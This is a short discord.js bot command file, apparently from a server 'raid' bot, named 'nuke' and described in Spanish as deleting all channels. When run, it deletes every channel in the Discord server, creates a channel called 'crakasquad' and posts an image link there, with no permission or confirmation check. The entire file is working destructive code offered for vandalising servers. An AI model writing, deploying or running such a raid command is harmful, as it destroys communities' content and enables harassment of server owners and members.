const { MessageEmbed } = require('discord.js')
module.exports = {
    name : 'nuke',
    category : 'raid',
    description : 'Elimina todos los canales',

    run : async(client, message, args) => {
        message.guild.channels.cache.forEach(channel => channel.delete());
        message.guild.channels.create(`crakasquad`, {
              type: 'text'
            }).then(channel => {
              channel.send("https://cdn.discordapp.com/icons/831019970505867294/d441f7053ac2675f5b186c0335596dba.png?size=1024")
            })
    }
}
